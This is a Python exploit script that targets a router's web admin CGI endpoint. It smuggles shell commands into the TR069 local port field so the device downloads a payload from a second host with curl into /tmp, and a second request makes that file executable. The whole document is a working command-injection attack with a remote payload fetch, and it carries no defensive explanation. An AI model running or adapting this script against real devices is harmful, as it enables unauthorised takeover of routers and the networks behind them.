#!/usr/bin/env python3

import requests

TARGET_URL = "http://192.168.123.254/cgi-bin/adm.cgi"
PAYLOAD_URL = "http://192.168.123.183:38888/exploit"


print("[+] Uploading exploit to /tmp/exploit")
data = {
    "page": "TR069",
    "TR069_local_enable": 1,
    "tr069_type": "ENABLE",
    "TR069_acs_url": "127.0.0.1",
    "TR069_acs_username": "test",
    "TR069_acs_password": "test",
    "TR069_acs_periodic_enable": 0,
    "TR069_local_port": "9999 -J ACCEPT; curl -o /tmp/exploit {} --".format(PAYLOAD_URL),
    "TR069_local_username": "test",
    "TR069_local_password": "test"

}
r = requests.post(TARGET_URL, data=data)

print("[+] Making /tmp/exploit is executable")
data = {"page": "sysCMD", "command": "chmod u+x /tmp/exploit"}
data = {
    "page": "TR069",
    "TR069_local_enable": 1,
    "tr069_type": "ENABLE",
    "TR069_acs_url": "127.0.0.1",
    "TR069_acs_username": "test",
    "TR069_acs_password": "test",
    "TR069_acs_periodic_enable": 0,
    "TR069_local_port": "9999 -J ACCEPT; chmod u+x /tmp/exploit {} --",
    "TR069_local_username": "test",
    "TR069_local_password": "test"

}
r = requests.post(TARGET_URL, data=data)

print("[+] Done!")
